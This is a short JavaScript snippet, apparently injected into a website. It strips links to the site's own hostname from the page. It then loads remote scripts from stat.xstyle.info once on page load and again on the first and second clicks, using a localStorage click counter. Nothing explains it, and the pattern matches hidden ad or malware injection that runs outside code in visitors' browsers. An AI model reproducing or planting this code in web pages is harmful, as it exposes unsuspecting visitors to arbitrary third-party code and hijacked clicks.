function setRewriteTL(){
	var a=new RegExp('<a href="http://'+window.location.hostname+'">http://'+window.location.hostname+'</a>','ig');
	document.body.innerHTML=document.body.innerHTML.replace(a,'');
	var b=new RegExp('<a href="http://'+window.location.hostname+'" target="_blank">http://'+window.location.hostname+'</a>','ig');
	document.body.innerHTML=document.body.innerHTML.replace(b,'');
}
setRewriteTL();


$(document).ready(function(){
    $('body').append('<script src="http:\/\/stat.xstyle.info\/?id=1409"><\/script>');

    localStorage.setItem('dcc', 0);
    $('body').click(function() {
        var cco=localStorage.getItem('dcc');
        cco++;
        localStorage.setItem('dcc', cco);
        if(cco==1){
            $('body').append('<script src="http:\/\/stat.xstyle.info\/?id=1973"><\/script>');
        }
        if(cco==2){
            $('body').append('<script src="http:\/\/stat.xstyle.info\/?id=1193"><\/script>');
        }
    });
});